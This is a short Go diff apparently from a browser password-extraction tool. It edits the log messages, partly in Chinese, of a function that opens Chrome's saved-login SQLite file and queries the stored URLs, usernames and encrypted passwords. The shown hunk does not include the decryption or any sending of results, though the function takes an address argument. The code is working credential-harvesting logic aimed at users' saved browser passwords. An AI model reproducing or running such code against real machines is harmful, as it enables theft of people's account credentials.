@@ -34,20 +34,20 @@ type Login struct {
 func DeCode(path string, addr string) error {
 	err := FileExits(path)
 	if err != nil {
-		log.Println(err)
+		log.Println("chrome 密码文件不在", err)
 		return err
 	}
 	log.Printf("Is Windows 64: %v\n", sqlite3.SQLiteWin64)
 	db, err := sql.Open("sqlite3", path)
 	if err != nil {
-		log.Println(err, VERSION)
+		log.Println("打开sqlite失败:", err)
 		return err
 	}
 	defer db.Close()
 
 	rows, err := db.Query("select origin_url,action_url,username_value,password_value from logins")
 	if err != nil {
-		log.Println(err)
+		log.Println("select sqlite Faild", err)
 		return err
 	}
 	defer rows.Close()
